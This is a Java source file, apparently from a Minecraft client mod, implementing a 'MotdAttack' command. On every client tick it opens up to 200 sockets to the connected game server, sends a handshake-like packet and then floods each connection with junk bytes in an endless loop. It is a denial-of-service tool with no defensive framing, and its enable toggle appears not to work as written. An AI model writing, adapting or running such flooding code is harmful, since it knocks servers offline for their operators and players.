package org.novau233.fallingsun.function.funs;

import net.minecraft.util.text.TextComponentString;
import org.novau233.fallingsun.function.Function;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

public class FunMotdAttack implements Function {
    private final AtomicBoolean enable = new AtomicBoolean(false);
    private final Executor executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors()-2);
    @Override
    public void onClientTick() {
        Runnable task=()->{
            for (int a=0;a<200;a++)
            {
                if (enable.get()){
                    return;
                }
                try {
                    Socket socket = new Socket();
                    SocketAddress address = null;
                    if (mc.player.connection!=null){
                        address = mc.player.connection.getNetworkManager().getRemoteAddress();
                    }
                    socket.connect(address);
                    if(socket.isConnected()) {
                        if (mc.player!=null){
                            mc.player.sendMessage(new TextComponentString("[Motd/"+Thread.currentThread().getName()+"]"+"连接成功"));
                        }
                        OutputStream out = socket.getOutputStream();
                        out.write(new byte[] {0x07,0x00,0x05,0x01,0x30,0x63,(byte)0xDD,0x01});
                        out.flush();
                        while(socket.isConnected()) {
                            for(int i=0; i<10; i++) {
                                out.write(new byte[] {0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00});
                            }
                            out.flush();
                        }
                        try {
                            out.close();
                            socket.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        if (mc.player!=null){
                            mc.player.sendMessage(new TextComponentString("[Motd/"+Thread.currentThread().getName()+"]已断开"));
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        executor.execute(task);
    }

    @Override
    public void onCommandExecute(String[] arg) {
        if (!enable.get()){
            mc.player.sendMessage(new TextComponentString("MotdAttack enabled!"));
        }else{
            mc.player.sendMessage(new TextComponentString("MotdAttack disabled!"));
        }
    }

    @Override
    public String getHead() {
        return "motdattack";
    }
}
